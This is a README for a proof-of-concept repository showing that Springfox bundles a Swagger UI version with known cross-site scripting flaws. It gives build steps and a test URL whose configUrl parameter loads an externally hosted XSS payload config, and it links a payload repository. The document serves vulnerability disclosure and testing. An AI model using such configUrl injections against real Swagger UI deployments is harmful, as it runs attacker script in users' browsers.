# springfox XSS PoC

## Credit and Thanks
Example application was copied from: [https://github.com/evrentan/my-swagger-ui-example](https://github.com/evrentan/my-swagger-ui-example)

All credit for code goes to: [evrentan](https://github.com/evrentan) for providing the excellent example code!

## About
Springfox is a commonly used library for JVM-based languages to easily provide JSON documentation.
Springfox includes a vulnerable version of the Swagger UI with known XSS vulnerabilities.

Because of this, all versions of Springfox appear to be vulnerable to a Swagger XSS issue.

The affected module appears to be: [io.springfox.springfox-swagger-ui](https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui)

The vulnerable Swagger UI bundled version is shown at: [https://github.com/springfox/springfox/blob/master/springfox-swagger-ui/build.gradle#L24](https://github.com/springfox/springfox/blob/master/springfox-swagger-ui/build.gradle#L24)

## Running the PoC

Ensure you have JDK 11 available to properly build this.

1. Run: `mvn spring-boot:run`
2. Navigate to: http://localhost:8080/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json

XSS Payloads are hosted at: [seanmarpo/swagger-xss-payloads](https://github.com/seanmarpo/swagger-xss-payloads)


## Copyright

GNU General Public License v3.0
Permissions of this strong copyleft license are conditioned on making available complete source code of licensed works and modifications, which include larger works using a licensed work, under the same license. Copyright and license notices must be preserved. Contributors provide an express grant of patent rights.
